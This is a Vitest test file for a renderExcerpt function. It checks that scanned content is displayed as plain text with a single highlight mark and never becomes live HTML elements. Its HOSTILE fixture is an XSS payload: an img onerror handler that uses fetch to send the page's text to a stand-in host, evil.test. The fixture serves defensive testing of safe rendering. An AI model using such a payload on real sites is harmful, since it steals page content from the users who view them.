// @vitest-environment happy-dom
import { describe, it, expect } from 'vitest'
import { renderExcerpt } from '../src/ui/render-excerpt'

const HOSTILE = '<img src=x onerror="fetch(\'https://evil.test/\'+document.body.innerText)">'

describe('renderExcerpt', () => {
  it('never creates elements from the scanned content', () => {
    const fragment = renderExcerpt(HOSTILE, 0, 3)
    const host = document.createElement('div')
    host.appendChild(fragment)

    expect(host.querySelectorAll('img')).toHaveLength(0)
    expect(host.querySelectorAll('script')).toHaveLength(0)
  })

  it('preserves the scanned text verbatim', () => {
    const fragment = renderExcerpt(HOSTILE, 0, 3)
    const host = document.createElement('div')
    host.appendChild(fragment)

    expect(host.textContent).toBe(HOSTILE)
  })

  it('marks the matched span without interpolating markup', () => {
    const fragment = renderExcerpt('const a = eval(x)', 10, 4)
    const host = document.createElement('div')
    host.appendChild(fragment)

    expect(host.querySelector('mark')?.textContent).toBe('eval')
    expect(host.textContent).toBe('const a = eval(x)')
  })

  it('produces only text nodes and a single mark element', () => {
    const fragment = renderExcerpt(HOSTILE, 5, 3)
    const host = document.createElement('div')
    host.appendChild(fragment)

    expect(host.querySelectorAll('*')).toHaveLength(1)
    expect(host.querySelector('mark')).not.toBeNull()
  })
})
